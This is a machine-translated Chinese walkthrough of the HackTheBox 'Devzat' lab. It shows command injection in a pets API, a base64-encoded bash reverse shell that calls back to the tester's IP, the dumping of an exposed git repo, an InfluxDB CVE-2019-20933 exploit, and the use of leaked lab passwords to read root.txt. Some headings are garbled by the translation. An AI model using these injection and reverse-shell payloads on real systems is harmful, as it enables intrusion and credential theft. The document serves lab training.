# 来自 HackTheBox 的开发—详细演练

> 原文：<https://infosecwriteups.com/devzat-from-hackthebox-detailed-walkthrough-46f39b25fa82?source=collection_archive---------2----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/f0bfcf89dd785f9b1b78edef0b110bcf.png)

Devzat 是 HackTheBox 上的中型机器。经过初步扫描后，我们发现了一个名为 Devzat 的开发者聊天系统版本。进一步的枚举揭示了包含源代码的 git repo。在那里，我们找到了一种方法来利用系统，并得到一个反向外壳。通过 SSH 隧道，我们发现了一个易受攻击的 InfluxDB 版本。利用它获得我们的用户信用，这导致了聊天系统的开发网站版本的备份。在查看代码之后，我们发现了一种从聊天系统的 dev 版本中读取文件的方法，这种方法让我们可以检索根标志来完成这个框。

所需的技能是枚举和阅读代码的能力。学到的技能是发现和利用漏洞，发现和利用源代码逻辑中的错误。

[](https://www.hackthebox.eu/home/machines/profile/398) [## Devzat —破解盒子::渗透测试实验室

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.eu](https://www.hackthebox.eu/home/machines/profile/398) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/cbaa811a077131da7bbe8af6829efcfc.png)

设备的 Nmap 扫描

我们有三个开放的港口。OpenSSH 在 22 上，Apache 在 80 上，端口 8000 上有一个无法识别的 SSH 服务。

首先，让我们将机箱名称放入 hosts 文件中:

```
┌──(root💀kali)-[~/htb/devzat]
└─# echo "10.10.11.118 devzat.htb" >> /etc/hosts
```

# 网站(全球资讯网的主机站)

现在我们来看看网站:

![](img/b7ba362db0cab56d3df7ec56ba2917a6.png)

Devzat 网站

# 发展聊天

这是一个简单的页面，包含开发人员聊天系统的详细信息和连接信息:

![](img/3ad1d29f76125b120b3afd0d78299345.png)

开发聊天连接信息

现在我们知道端口 8000 上有什么。让我们试一试:

```
┌──(root💀kali)-[~/htb/devzat]
└─# ssh -l pencer devzat.htb -p 8000

devbot: You seem to be new here . Welcome to Devzat! Run /help to see what you can do.
Welcome to the chat. There are no more users
devbot: pencer has joined the chat
pencer: /help

[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM] 
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM] 
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM] 
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM] 
[SYSTEM] For a list of commands run
```

这是 Github 上的 Devzat 版本[这里](https://github.com/quackduck/devzat)。我们以后可能需要深入研究源代码，因为现在我们可以检查哪些命令可用:

```
[SYSTEM] ┃ /commands
pencer: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
```

我们可以使用可用的命令，但是这里没有任何有用的命令:

```
pencer: /emojis
[SYSTEM] Check out github.com/ikatyang/emoji-cheat-sheet
pencer: /users
[SYSTEM] [pencer]
pencer: /all
[SYSTEM] [/all hello hello pencer plssub SYSTEM test test]
pencer: /shrug
pencer: ¯(ツ)/¯
pencer: /id
[SYSTEM] a1ccf7c03332a87bb3cb8e401cbeeca365de4b9a847f48e44d9d5baf0410cf45
pencer: /room
[SYSTEM] You are currently in #main
[SYSTEM] Rooms and users
[SYSTEM] #main: [pencer]
pencer: /example-code
[SYSTEM] ┃ package main
         ┃ import "fmt"
         ┃ func main() {
         ┃    fmt.Println("Example!")
         ┃ }
pencer: /exit
Connection to devzat.htb closed.
```

# Gobuster

让我们退出，做一些枚举，看看是否有其他我们可以找到的东西:

```
┌──(root💀kali)-[~/htb/devzat]
└─# gobuster vhost -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devzat.htb -o results.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devzat.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/28 22:16:00 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mail2.devzat.htb (Status: 302) [Size: 284]
Found: autoconfig.devzat.htb (Status: 302) [Size: 289]
<SNIP>
Found: ip204-109.devzat.htb (Status: 302) [Size: 288]
Found: sugiyama1.devzat.htb (Status: 302) [Size: 288]
===============================================================
2021/10/28 22:16:37 Finished
===============================================================

┌──(root💀kali)-[~/htb/devzat]
└─# cat results.txt | grep "Status: 20"
Found: pets.devzat.htb (Status: 200) [Size: 510]
```

我们找到一个叫做 pets 的子域。添加到主机文件，然后在浏览器中查看:

![](img/52ff693c29b889c0afc25370b8abec7d.png)

我的宠物在宠物清单上

我们可以添加自己的宠物，但它不做任何有趣的事情。看一下 Burp，就可以发现发布的两个字段:

![](img/51f87ba4e00d2360dda97b4826a86740.png)

打嗝拦截请求

# 与宠物互动

我们也可以从终端执行此操作:

```
┌──(root💀kali)-[~/htb/devzat]
└─# curl -d '{"name":"test1","species":"giraffe"}' -X POST http://pets.devzat.htb/api/pet
Pet was added successfully
```

是时候进行更多的枚举了。这一次，让我们看看有趣的文件夹的宠物子域:

```
┌──(root💀kali)-[~/htb/devzat]
└─# gobuster dir -t 100 -w /usr/share/wordlists/dirb/common.txt -u http://pets.devzat.htb/ --exclude-length 510 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pets.devzat.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          510
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/28 22:41:08 Starting gobuster in directory enumeration mode
===============================================================
/build                (Status: 301) [Size: 42] [--> /build/]
/css                  (Status: 301) [Size: 40] [--> /css/]  
/.git/HEAD            (Status: 200) [Size: 23]              
/server-status        (Status: 403) [Size: 280]             
===============================================================
2021/10/28 22:41:14 Finished
===============================================================
```

# Git 回购

我的眼睛被吸引到。git 文件夹。为什么会在上面？让我们来看看:

```
┌──(root💀kali)-[~/htb/devzat]
└─# curl http://pets.devzat.htb/.git/
<pre>
<a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a>
<a href="HEAD">HEAD</a>
<a href="branches/">branches/</a>
<a href="config">config</a>
<a href="description">description</a>
<a href="hooks/">hooks/</a>
<a href="index">index</a>
<a href="info/">info/</a>
<a href="logs/">logs/</a>
<a href="objects/">objects/</a>
<a href="refs/">refs/</a>
</pre>
```

我们可以看到这是一个 git 存储库，有几个文件和一些文件夹:

```
┌──(root💀kali)-[~/htb/devzat]
└─# curl http://pets.devzat.htb/.git/COMMIT_EDITMSG
back again to localhost only

┌──(root💀kali)-[~/htb/devzat]
└─# curl http://pets.devzat.htb/.git/logs/HEAD     
0000000000000000000000000000000000000000 8274d7a547c0c3854c074579dfc359664082a8f6 patrick <patrick@devzat.htb> 1624391552 +0000 commit (initial): init
8274d7a547c0c3854c074579dfc359664082a8f6 464614f32483e1fde60ee53f5d3b4d468d80ff62 patrick <patrick@devzat.htb> 1624474943 +0000 commit: fixed broken fonts
464614f32483e1fde60ee53f5d3b4d468d80ff62 ef07a04ebb2fc92cf74a39e0e4b843630666a705 patrick <patrick@devzat.htb> 1624475172 +0000 commit: back again to localhost only
```

# Gitdumper

我们需要转储 git repo，这样我们就可以轻松地查看它。在前面一个名为[旅行](https://www.hackthebox.com/home/machines/profile/252)的盒子中，我们使用了 [GitDumper](https://github.com/internetwache/GitTools) ，让我们再来一次:

```
┌──(root💀kali)-[~/htb/devzat]
└─# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 229, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209
Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.
Resolving deltas: 100% (85/85), done.

┌──(root💀kali)-[~/htb/devzat/GitTools/Dumper]
└─# ./gitdumper.sh http://pets.devzat.htb/.git/ pets_git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
###########
[*] Destination folder does not exist
[+] Creating pets_git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
<SNIP>
[+] Downloaded: objects/f3/3e8162997aaa9da582aa81428ee87aa48953a6
[+] Downloaded: objects/73/c1a4d5d156b6ddc62a7e3eba1c206bd6ad19c8
[+] Downloaded: objects/dc/52d954d8d7f62c82cf63236d27093764a3d046
```

现在我们需要提取转储:

```
┌──(root💀kali)-[~/htb/devzat]
└─# ./GitTools/Extractor/extractor.sh pets_git extracted
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 8274d7a547c0c3854c074579dfc359664082a8f6
[+] Found file: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/.gitignore
[+] Found folder: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics
[+] Found file: /root/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6/characteristics/bluewhale
<SNIP>
[+] Found file: /root/htb/devzat/extracted/2-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/App.svelte
[+] Found file: /root/htb/devzat/extracted/2-ef07a04ebb2fc92cf74a39e0e4b843630666a705/static/src/main.js
```

现在我们可以在本地查看 git repo 内部:

```
┌──(root💀kali)-[~/htb/devzat]
└─# cd extracted 

┌──(root💀kali)-[~/htb/devzat/extracted]
└─# ls     
0-8274d7a547c0c3854c074579dfc359664082a8f6
1-464614f32483e1fde60ee53f5d3b4d468d80ff62 
2-ef07a04ebb2fc92cf74a39e0e4b843630666a705

┌──(root💀kali)-[~/htb/devzat/extracted]
└─# ls 0-8274d7a547c0c3854c074579dfc359664082a8f6 
characteristics  commit-meta.txt  go.mod  go.sum  main.go  petshop  start.sh  static
```

我们有前面看到的三个提交。看第一个，我们可以看到它是我们刚刚看过的 pets 站点的源代码。深入研究 main.go 文件，我们会发现这一部分:

![](img/c1e628fd290c842811020d91ef53ba82.png)

main.go 文件的源代码

# TCPDump

```
┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]
└─# curl -d '{"name":"pencer","species":"giraffe;ping -c 4 10.10.14.235"}' -X POST http://pets.devzat.htb/api/pet
Pet was added successfully
```

# 反向外壳

```
┌──(root💀kali)-[~/htb/devzat]
└─# tcpdump icmp -i tun0      
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:10:45.396719 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 1, length 64
23:10:45.396729 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 1, length 64
23:10:46.398232 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 2, length 64
23:10:46.398241 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 2, length 64
23:10:47.399926 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 3, length 64
23:10:47.399936 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 3, length 64
23:10:48.401262 IP devzat.htb > 10.10.14.235: ICMP echo request, id 11, seq 4, length 64
23:10:48.401273 IP 10.10.14.235 > devzat.htb: ICMP echo reply, id 11, seq 4, length 64
```

现在切换到正在等待的 netcat 监听器:

```
┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]
└─# echo -n 'bash -i >& /dev/tcp/10.10.15.40/1337 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MC8xMzM3IDA+JjE=

┌──(root💀kali)-[~/htb/devzat/extracted/0-8274d7a547c0c3854c074579dfc359664082a8f6]
└─# curl -d '{"name":"pencer","species":"giraffe;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40MC8xMzM3IDA+JjE= | base64 -d | bash"}  ' -X POST http://pets.devzat.htb/api/pet
```

随着 shell 升级到更有用的版本，我快速浏览了一下:

```
┌──(root💀kali)-[~/htb/devzat]
└─# nc -lvvp 1337                              
listening on [any] 1337 ...
connect to [10.10.15.40] from devzat.htb [10.10.11.118] 42062
patrick@devzat:~/pets$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
patrick@devzat:~/pets$ ^Z
zsh: suspended  nc -lvvp 1337
┌──(root💀kali)-[~/htb/devzat]
└─# stty raw -echo; fg
[1]  + continued  nc -lvvp 1337
patrick@devzat:~/pets$
```

# 宋承宪饰演帕特里克

我们看到只有两个用户，并且标志不在 Patrick 的主文件夹中。所以我们可以假设下一步需要上报给凯瑟琳。Patrick 有一个私有的 SSH 密钥，因此我将退出这个反向 shell，以他的身份通过 SSH 登录，以获得更好的连接:

```
patrick@devzat:~/pets$ ls -lsa /home       
4 drwxr-xr-x  5 catherine catherine 4096 Oct 31 20:46 catherine
4 drwxr-xr-x  9 patrick   patrick   4096 Sep 24 14:57 patrick

patrick@devzat:~/pets$ ls -lsa /home/patrick
0 lrwxrwxrwx 1 root    root       9 Jun 22 20:40 .bash_history -> /dev/null
4 -rw-r--r-- 1 patrick patrick  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 patrick patrick 3809 Jun 22 18:43 .bashrc
4 drwx------ 3 patrick patrick 4096 Jun 22 20:17 .cache
4 drwx------ 3 patrick patrick 4096 Jun 23 16:00 .config
4 drwxr-x--- 2 patrick patrick 4096 Sep 23 15:07 devzat
4 -rw-rw-r-- 1 patrick patrick   51 Jun 22 19:52 .gitconfig
4 drwxrwxr-x 3 patrick patrick 4096 Jun 22 18:51 go
4 drwxrwxr-x 4 patrick patrick 4096 Jun 22 18:50 .npm
4 drwxrwx--- 5 patrick patrick 4096 Jun 23 19:05 pets
4 -rw-r--r-- 1 patrick patrick  807 Feb 25  2020 .profile
4 drwxrwxr-x 2 patrick patrick 4096 Sep 29 16:33 .ssh
```

把这个密钥复制到 Kali 上的一个文件中:

```
patrick@devzat:~/pets$ cd /home/patrick/

patrick@devzat:~$ cat .ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
n3LMfTlr/Fl0V3AAAADnBhdHJpY2tAZGV2emF0AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

现在 SSH 在使用私钥:

```
┌──(root💀kali)-[~/htb/devzat]
└─# ssh -i id_rsa patrick@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Sun Oct 31 20:38:41 2021 from 10.10.14.37
patrick@devzat:~$
```

# Netstat

像往常一样，让我们先看看一些显而易见的东西，如果没有什么突出的东西，那么我们可以让 LinPEAS 过来帮忙。当我看到开放的港口时，我注意到一些有趣的事情:

```
patrick@devzat:~$ netstat -tunepl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1000       36107      838/./petshop       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        32508      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      0          36829      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          34658      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      0          36030      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          36126      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          34660      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      1000       36036      840/./devchat       
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        32424      -
```

在本地主机/127.0.0.1 上监听的端口在 nmap 扫描中没有显示出来。我们可以查找在该地址上运行的进程:

```
patrick@devzat:~$ ps -ef | grep 127.0.0.1
root        1253     996  0 20:33 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086
```

# SSH 隧道

docker 容器绝对值得进一步研究。要与之交互，我们需要从 Kali 到盒子的隧道端口。就像我们在 HackTheBox 机器上所做的一样 [Explore](https://pencer.io/ctf/ctf-htb-explore) 让我们创建一个 SSH 连接，并将任何对端口 8086 的本地访问转发到 devzat:

```
┌──(root💀kali)-[~/htb/devzat]
└─# ssh -L 8086:localhost:8086 -i id_rsa patrick@devzat.htb                                                                                                                     
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Sun Oct 31 21:25:50 2021 from 10.10.15.40
patrick@devzat:~$
```

现在，当我们尝试本地访问端口 8086 时，它会传递到机器:

```
┌──(root💀kali)-[~/htb/devzat]
└─# curl http://localhost:8086 
404 page not found
```

# NMAP 扫描

对该端口的快速扫描显示，它正在托管一个 InfluxDB:

```
┌──(root💀kali)-[~/htb/devzat]
└─# nmap -p 8086 -sV localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 21:41 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000024s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8086/tcp open  http    InfluxDB http admin 1.7.5

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

# InfluxDB

看看 [InfluxDB 版本 1.7.6](https://docs.influxdata.com/influxdb/v1.8/about_the_project/releasenotes-changelog/#176-2019-04-16) 的发行说明就知道了:

```
Fix security vulnerability when [http]shared-secret configuration setting is blank.
```

所以 1.7.5 是易受攻击的，在谷歌上搜索漏洞首先会出现:

![](img/bf32a9ccb3c02e46d2512d0d5f9d1f31.png)

搜索 InfluxDB 漏洞

让我们抓住漏洞，按照这里[的描述运行](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933):

```
┌──(root💀kali)-[~/htb/devzat]
└─# git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 20 (delta 5), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (20/20), 5.97 KiB | 2.98 MiB/s, done.
Resolving deltas: 100% (5/5), done.
Command 'pip' not found, but can be installed with:
apt install python3-pip
Do you want to install it? (N/y)y
apt install python3-pip
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Preparing to unpack .../python3-pip_20.3.4-4_all.deb ...
Unpacking python3-pip (20.3.4-4) ...
Setting up python3-wheel (0.34.2-1) ...
Setting up python3-pip (20.3.4-4) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.4.0) ...

┌──(root💀kali)-[~/htb/devzat/InfluxDB-Exploit-CVE-2019-20933]
└─# pip install -r requirements.txt
Collecting pip~=21.0.1
  Downloading pip-21.0.1-py3-none-any.whl (1.5 MB)
     |████████████████████████████████| 1.5 MB 3.6 MB/s 
Requirement already satisfied: pytz~=2021.1 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2021.1)
<SNIP>
Successfully installed PyJWT-2.0.1 certifi-2020.12.5 idna-3.3 influxdb-5.3.1 numpy-1.20.3 pandas-1.2.5 pip-21.0.1 setuptools-56.0.0 six-1.15.0
```

# 利用涌入 b

我必须先安装 pip，因为这个 Kali 安装程序还没有它。之后，我安装了需求，所以现在我们可以运行利用:

![](img/276a2f0b187d29e1a5f8a73873d0e7ca.png)

InfluxDB 漏洞利用

漏洞成功了，我们已经连接到数据库。接下来的这一点花了我很长时间，但最终我发现这很有效:

```
[devzat] Insert query (exit to change db): select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

# 将用户切换到 Catherine

我们有三个用户和密码。我们知道 Catherine 是机器上的第二个用户，她尝试通过 SSH 登录，但失败了，但是我们可以切换用户:

```
patrick@devzat:~$ su catherine
Password:
```

列举凯瑟琳所有的东西显示了一些有趣的事情:

```
catherine@devzat:~$ find / -group catherine -not -path "/proc/*" 2> /dev/null
/home/catherine
/home/catherine/.profile
/home/catherine/.cache
/home/catherine/.cache/motd.legal-displayed
/home/catherine/.bashrc
/home/catherine/.ssh
/home/catherine/.ssh/id_rsa.pub
/home/catherine/.ssh/id_rsa
/home/catherine/.ssh/known_hosts
/home/catherine/.ssh/authorized_keys
/home/catherine/user.txt
/home/catherine/.gnupg
/home/catherine/.gnupg/private-keys-v1.d
/home/catherine/.bash_logout
/var/backups/devzat-main.zip
/var/backups/devzat-dev.zip
```

# 发现的备份

主站点和开发站点的备份，值得一看为什么 Catherine 拥有它们:

```
catherine@devzat:~$ cp /var/backups/devzat-main.zip /dev/shm
catherine@devzat:~$ cp /var/backups/devzat-dev.zip /dev/shm
catherine@devzat:~$ cd /dev/shm/
catherine@devzat:/dev/shm$ unzip devzat-dev.zip
Archive:  devzat-dev.zip
   creating: dev/
  inflating: dev/go.mod
<SNIP>
 extracting: dev/allusers.json

catherine@devzat:/dev/shm$ unzip devzat-main.zip
Archive:  devzat-main.zip
   creating: main/
  inflating: main/go.mod
<SNIP>
  inflating: main/allusers.json
```

# 不同文件

我们可以使用 diff 来检查两个文件夹的更改:

```
catherine@devzat:/dev/shm$ find dev -type f|sort|xargs ls -l| awk '{print $5,$8}' > dev.txt
catherine@devzat:/dev/shm$ find main -type f|sort|xargs ls -l| awk '{print $5,$8}' > main.txt
catherine@devzat:/dev/shm$ diff dev.txt main.txt 
1c1
< 3 06:37
---
> 108 06:38
5,6c5,6
< 13827 18:35
< 11341 06:56
---
> 12403 18:35
> 11332 06:54
16d15
< 356 18:35
```

三个文件略有不同，我们可以再次使用 diff 来查看每个文件:

```
catherine@devzat:/dev/shm$ diff dev/devchat.go main/devchat.go 
27c27
<       port = 8443
---
>       port = 8000
114c114
<               fmt.Sprintf("127.0.0.1:%d", port),
---
>               fmt.Sprintf(":%d", port),
```

# 代码审查

我们看到 devchat.go 文件的 dev 版本中有端口 8443。我们之前从外部访问端口 8000 来访问聊天，因此这显示了我们在机器内部使用端口 8443 来访问 dev 版本。

8443 个文件的 grep 找到了这个:

```
catherine@devzat:/dev/shm$ grep -rn "8443"
main/devchat.go:194:            u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
dev/devchat.go:27:      port = 8443
dev/devchat.go:194:             u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
```

这确认了我们将在机器上本地访问 dev 实例。commands.go 的不同之处在于:

```
catherine@devzat:/dev/shm$ diff dev/commands.go main/commands.go 
<SNIP>
<               file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
<SNIP>
< func fileCommand(u *user, args []string) {
<       if len(args) < 1 {
<               u.system("Please provide file to print and the password")
<               return
<       }
<       if len(args) < 2 {
<               u.system("You need to provide the correct password to use this function")
<               return
<       }
<       path := args[0]
<       pass := args[1]
< 
<       // Check my secure password
<       if pass != "CeilingCatStillAThingIn2021?" {
<               u.system("You did provide the wrong password")
<               return
<       }
```

一个只存在于 dev 版本中的新命令允许我们读取一个文件并直接显示在聊天中。我们只需要一个在代码中方便提供的密码！

# 宋承宪饰演凯瑟琳

我们来连线:

```
catherine@devzat:~$ ssh -p 8443 catherine@localhost
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine:
```

# 根标志

现在我们可以轻松地抓住根标志:

```
catherine: /file ../root.txt CeilingCatStillAThingIn2021?
[SYSTEM] 374fe32e1eb4e8585a85d0d89883b636
```

完成了。下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 4 月 13 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-devzat)*。*